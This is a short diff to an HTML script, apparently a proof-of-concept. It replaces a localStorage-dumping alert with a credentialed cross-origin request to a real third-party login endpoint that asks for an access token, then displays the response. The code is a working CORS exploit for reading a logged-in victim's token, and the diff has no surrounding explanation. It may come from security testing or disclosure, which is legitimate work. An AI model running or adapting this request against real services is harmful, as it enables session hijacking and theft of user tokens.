@@ -1,3 +1,19 @@
 <script>
-alert(JSON.stringify(localStorage));
+var invocation = new XMLHttpRequest();
+
+  invocation.onreadystatechange = function() {
+    if (invocation.readyState == XMLHttpRequest.DONE) {
+      alert(invocation.response);
+    }
+  }
+
+function cors(){
+  if(invocation) {
+    invocation.open('GET', "https://login.peoplebrowsr.com/check/dotceo?client_id=5334ed7eb7725d5b8c9f03ed&response_type=token&sessionid=&onlogout=http%3A%2F%2Fapp.nft.nyc%2Faccount%2Flogout%3Fpreauth%3D7291d925-d4c1-4fb9-a7fc-e10a667b27ad", true);
+    invocation.withCredentials = true;
+    invocation.send(); 
+  }
+}
+
+cors();
 </script>
